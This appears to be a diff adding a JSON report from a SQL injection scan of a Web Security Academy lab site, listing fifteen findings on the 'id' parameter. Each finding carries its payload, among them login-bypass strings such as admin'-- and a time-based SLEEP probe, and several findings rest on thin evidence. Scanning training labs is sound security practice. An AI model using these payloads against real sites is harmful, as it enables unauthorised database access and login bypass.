@@ -1,0 +1,165 @@
+{
+  "scan_info": {
+    "target": "https://0a0600ae04776eae8078088700a5003a.web-security-academy.net/",
+    "scan_date": "2025-10-24 09:55:09",
+    "module": "auxiliary/scanner/web/sql_injection",
+    "vulnerabilities_found": 15
+  },
+  "vulnerabilities": [
+    {
+      "type": "Basic SQL injection",
+      "url": "https://0a0600ae04776eae8078088700a5003a.web-security-academy.net/",
+      "parameter": "id",
+      "payload": "'",
+      "evidence": "SQL error in response",
+      "risk_level": "High",
+      "confidence": "High",
+      "response_code": 200
+    },
+    {
+      "type": "Basic SQL injection",
+      "url": "https://0a0600ae04776eae8078088700a5003a.web-security-academy.net/",
+      "parameter": "id",
+      "payload": "''",
+      "evidence": "SQL error in response",
+      "risk_level": "High",
+      "confidence": "High",
+      "response_code": 200
+    },
+    {
+      "type": "Basic SQL injection",
+      "url": "https://0a0600ae04776eae8078088700a5003a.web-security-academy.net/",
+      "parameter": "id",
+      "payload": "`",
+      "evidence": "SQL error in response",
+      "risk_level": "High",
+      "confidence": "High",
+      "response_code": 200
+    },
+    {
+      "type": "Basic SQL injection",
+      "url": "https://0a0600ae04776eae8078088700a5003a.web-security-academy.net/",
+      "parameter": "id",
+      "payload": "\\",
+      "evidence": "SQL error in response",
+      "risk_level": "High",
+      "confidence": "High",
+      "response_code": 200
+    },
+    {
+      "type": "Basic SQL injection",
+      "url": "https://0a0600ae04776eae8078088700a5003a.web-security-academy.net/",
+      "parameter": "id",
+      "payload": "\"",
+      "evidence": "SQL error in response",
+      "risk_level": "High",
+      "confidence": "High",
+      "response_code": 200
+    },
+    {
+      "type": "Basic SQL injection",
+      "url": "https://0a0600ae04776eae8078088700a5003a.web-security-academy.net/",
+      "parameter": "id",
+      "payload": "' OR '1'='1",
+      "evidence": "SQL error in response",
+      "risk_level": "High",
+      "confidence": "High",
+      "response_code": 200
+    },
+    {
+      "type": "Basic SQL injection",
+      "url": "https://0a0600ae04776eae8078088700a5003a.web-security-academy.net/",
+      "parameter": "id",
+      "payload": "' OR 1=1",
+      "evidence": "SQL error in response",
+      "risk_level": "High",
+      "confidence": "High",
+      "response_code": 200
+    },
+    {
+      "type": "Basic SQL injection",
+      "url": "https://0a0600ae04776eae8078088700a5003a.web-security-academy.net/",
+      "parameter": "id",
+      "payload": "' OR 1=1--",
+      "evidence": "SQL error in response",
+      "risk_level": "High",
+      "confidence": "High",
+      "response_code": 200
+    },
+    {
+      "type": "Basic SQL injection",
+      "url": "https://0a0600ae04776eae8078088700a5003a.web-security-academy.net/",
+      "parameter": "id",
+      "payload": "' OR 'a'='a",
+      "evidence": "SQL error in response",
+      "risk_level": "High",
+      "confidence": "High",
+      "response_code": 200
+    },
+    {
+      "type": "Basic SQL injection",
+      "url": "https://0a0600ae04776eae8078088700a5003a.web-security-academy.net/",
+      "parameter": "id",
+      "payload": "1 OR 1=1",
+      "evidence": "SQL error in response",
+      "risk_level": "High",
+      "confidence": "High",
+      "response_code": 200
+    },
+    {
+      "type": "Basic SQL injection",
+      "url": "https://0a0600ae04776eae8078088700a5003a.web-security-academy.net/",
+      "parameter": "id",
+      "payload": "1' OR '1'='1",
+      "evidence": "SQL error in response",
+      "risk_level": "High",
+      "confidence": "High",
+      "response_code": 200
+    },
+    {
+      "type": "Basic SQL injection",
+      "url": "https://0a0600ae04776eae8078088700a5003a.web-security-academy.net/",
+      "parameter": "id",
+      "payload": "admin'--",
+      "evidence": "SQL error in response",
+      "risk_level": "High",
+      "confidence": "High",
+      "response_code": 200
+    },
+    {
+      "type": "Basic SQL injection",
+      "url": "https://0a0600ae04776eae8078088700a5003a.web-security-academy.net/",
+      "parameter": "id",
+      "payload": "test' OR '1'='1'--",
+      "evidence": "SQL error in response",
+      "risk_level": "High",
+      "confidence": "High",
+      "response_code": 200
+    },
+    {
+      "type": "Basic SQL injection",
+      "url": "https://0a0600ae04776eae8078088700a5003a.web-security-academy.net/",
+      "parameter": "id",
+      "payload": "administrator'--",
+      "evidence": "SQL error in response",
+      "risk_level": "High",
+      "confidence": "High",
+      "response_code": 200
+    },
+    {
+      "type": "Time-based blind SQL injection (MySQL)",
+      "url": "https://0a0600ae04776eae8078088700a5003a.web-security-academy.net/",
+      "parameter": "id",
+      "payload": "' AND SLEEP(2)--",
+      "evidence": "Response delayed by 6.19 seconds",
+      "risk_level": "Medium",
+      "confidence": "Medium",
+      "response_code": 200
+    }
+  ],
+  "summary": {
+    "high_risk": 14,
+    "medium_risk": 1,
+    "low_risk": 0
+  }
+}
